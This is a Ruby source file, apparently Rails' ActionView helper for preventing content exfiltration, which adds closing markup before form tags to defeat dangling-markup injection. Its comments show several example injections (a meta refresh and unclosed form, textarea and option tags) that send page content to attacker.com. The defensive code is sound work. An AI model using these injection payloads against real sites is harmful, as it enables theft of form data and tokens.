# frozen_string_literal: true

module ActionView
  module Helpers
    module ContentExfiltrationPreventionHelper
      mattr_accessor :prepend_content_exfiltration_prevention, default: false

      # Close any open attributes before each form tag. This prevents attackers from
      # injecting partial tags that could leak markup offsite.
      #
      # For example, an attacker might inject:
      #
      #   <meta http-equiv="refresh" content='0;URL=https://attacker.com?
      #
      # The HTML following this tag, up until the next single quote would be sent to
      # +https://attacker.com+. By closing any open attributes, we ensure that form
      # contents are never exfiltrated this way.
      CLOSE_QUOTES_COMMENT = %q(<!-- '"` -->).html_safe.freeze

      # Close any open tags that support CDATA (textarea, xmp) before each form tag.
      # This prevents attackers from injecting unclosed tags that could capture
      # form contents.
      #
      # For example, an attacker might inject:
      #
      #   <form action="https://attacker.com"><textarea>
      #
      # The HTML following this tag, up until the next <tt></textarea></tt> or
      # the end of the document would be captured by the attacker's
      # <tt><textarea></tt>. By closing any open textarea tags, we ensure that
      # form contents are never exfiltrated.
      CLOSE_CDATA_COMMENT = "<!-- </textarea></xmp> -->".html_safe.freeze

      # Close any open option tags before each form tag. This prevents attackers
      # from injecting unclosed options that could leak markup offsite.
      #
      # For example, an attacker might inject:
      #
      #   <form action="https://attacker.com"><option>
      #
      # The HTML following this tag, up until the next <tt></option></tt> or the
      # end of the document would be captured by the attacker's
      # <tt><option></tt>. By closing any open option tags, we ensure that form
      # contents are never exfiltrated.
      CLOSE_OPTION_TAG = "</option>".html_safe.freeze

      # Close any open form tags before each new form tag. This prevents attackers
      # from injecting unclosed forms that could leak markup offsite.
      #
      # For example, an attacker might inject:
      #
      #   <form action="https://attacker.com">
      #
      # The form elements following this tag, up until the next <tt></form></tt>
      # would be captured by the attacker's <tt><form></tt>. By closing any open
      # form tags, we ensure that form contents are never exfiltrated.
      CLOSE_FORM_TAG = "</form>".html_safe.freeze

      CONTENT_EXFILTRATION_PREVENTION_MARKUP = (CLOSE_QUOTES_COMMENT + CLOSE_CDATA_COMMENT + CLOSE_OPTION_TAG + CLOSE_FORM_TAG).freeze

      def prevent_content_exfiltration(html)
        if prepend_content_exfiltration_prevention
          CONTENT_EXFILTRATION_PREVENTION_MARKUP + html
        else
          html
        end
      end
    end
  end
end
